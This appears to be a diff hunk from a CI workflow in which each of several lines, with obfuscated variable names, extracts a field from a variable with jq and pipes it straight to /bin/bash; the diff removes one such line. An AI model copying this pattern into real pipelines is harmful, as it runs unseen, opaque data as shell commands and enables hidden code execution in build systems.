@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$ryjg8645" | jq -r .mr4 | /bin/bash
           echo $ipz2136 | jq -r .zog134 | /bin/bash
           printf '%s' "$mftha33" | jq -r .f24083 | /bin/bash
-          echo $dutok43491 | jq -r .vfkg0476 | /bin/bash
           echo $vy8 | jq -r .pouyg490 | /bin/bash
           printf '%s' "$yos0" | jq -r .voca01 | /bin/bash
 
